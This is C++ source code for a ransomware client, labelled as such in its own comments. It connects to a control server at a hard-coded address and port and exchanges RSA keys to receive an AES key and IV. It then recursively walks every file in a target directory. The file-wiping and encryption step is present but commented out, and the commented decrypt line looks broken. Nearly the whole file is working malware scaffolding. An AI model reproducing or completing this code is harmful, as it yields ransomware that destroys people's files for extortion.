#include "crypto.hpp"
#include "cryptopp/socketft.h"
#include <fstream>
#include <iostream>
#include <string>
#if defined(_WIN32)&&!defined(__CYGWIN__)
	#define _SCL_SECURE_NO_WARNINGS
	#include <windows.h>
#else
	#include <dirent.h>
	#include <stdlib.h>
#endif
#include "wipe.hpp"

std::string addr("127.0.0.1");
size_t port=4444;
std::string ransom_directory(".");

//Recursively traverse files in path calling handler on each of them...
void traverse_files(const std::string& path,const std::string& key,const std::string& iv,
	void(*handler)(const std::string&,const std::string&,const std::string&))
{
	#if defined(_WIN32)&&!defined(__CYGWIN__)
		const unsigned int buffer_size=65536;
		char buffer[buffer_size];
		if(GetFullPathName(path.c_str(),buffer_size,buffer,NULL)==0)
			return;
		std::string full_path_name(buffer);
		std::string full_path_wildcard=full_path_name+"\\*.*";
		WIN32_FIND_DATA file_descriptor;
		HANDLE file_handle=FindFirstFile(full_path_wildcard.c_str(),&file_descriptor);
		if(file_handle==INVALID_HANDLE_VALUE)
			return;
		do
		{
			std::string node_name=(file_descriptor.cFileName);
			bool file=(file_descriptor.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)==0;
			bool folder=!file;
			if(node_name!="."&&node_name!="..")
			{
				if(file)
					handler(path+"\\"+node_name,key,iv);
				else if(folder)
					traverse_files(path+"\\"+node_name,key,iv,handler);
			}
		}
		while(FindNextFile(file_handle,&file_descriptor));
		FindClose(file_handle);
	#else
		DIR* dp=opendir(path.c_str());
		while(dp!=NULL)
		{
			dirent* np=readdir(dp);
			if(np==NULL)
			{
				closedir(dp);
				break;
			}
			std::string node_name(np->d_name);
			bool file=(np->d_type==DT_REG);
			bool folder=(np->d_type==DT_DIR||np->d_type==DT_LNK);
			if(node_name!="."&&node_name!="..")
			{
				if(file)
					handler(path+"/"+node_name,key,iv);
				else if(folder)
					traverse_files(path+"/"+node_name,key,iv,handler);
			}
		}
	#endif
}

//Custom file handler...
void file_handler(const std::string& filepath,const std::string& key,const std::string& iv)
{
	std::cout<<filepath<<std::endl;
	//aes_t aes(key,iv);
	//ransomware encrypt
	//std::string plain;
	//if(file_to_string(filepath,plain)&&spc_file_wipe(filepath))
	//	string_to_file(aes.encrypt(plain),filepath);
	//ransomware decrypt
	//std::string cipher;
	//if(file_to_string(filepath,cipher))
	//	string_to_file(aes.decrypt(key),filepath);
}

int main()
{
	CryptoPP::Socket::StartSockets();
	CryptoPP::Socket client;
	client.Create(SOCK_STREAM);
	while(true)
	{
		try
		{
			std::cout<<"Connected to "<<addr<<":"<<port<<"."<<std::endl;
			try
			{
				client.Connect(addr.c_str(),port);
			}
			catch(...)
			{
				throw std::runtime_error("Connect failed.");
			}
			std::cout<<"Connected."<<std::endl;
			timeval time={0,0};
			if(!client.SendReady(&time))
				throw std::runtime_error("Not ready to send.");
			rsa_t rsa;
			std::string pubkey(rsa.get_public());
			std::cout<<"Generated public key."<<std::endl;
			if(client.Send((unsigned char*)pubkey.c_str(),pubkey.size())!=pubkey.size())
				throw std::runtime_error("Send failed.");
			std::cout<<"Sent public key."<<std::endl;
			unsigned char data;
			std::string uid;
			while(true)
			{
				if(client.Receive(&data,1)!=1)
				{
					try
					{
						uid=rsa.decrypt(uid);
					}
					catch(...)
					{
						throw std::runtime_error("Data decryption failed.");
					}
					if(uid.size()!=40+32+16)
						throw std::runtime_error("Invalid server response.");
					std::string key=uid.substr(40,32);
					std::string iv=uid.substr(40+32,16);
					uid=uid.substr(0,40);
					std::cout<<"UID is: "<<uid<<std::endl;
					traverse_files(ransom_directory,key,iv,file_handler);
					return 0;
				}
				uid+=data;
			}
		}
		catch(std::exception &error)
		{
			std::cout<<error.what()<<std::endl;
		}
	}
	client.CloseSocket();
	CryptoPP::Socket::ShutdownSockets();
	return 0;
}
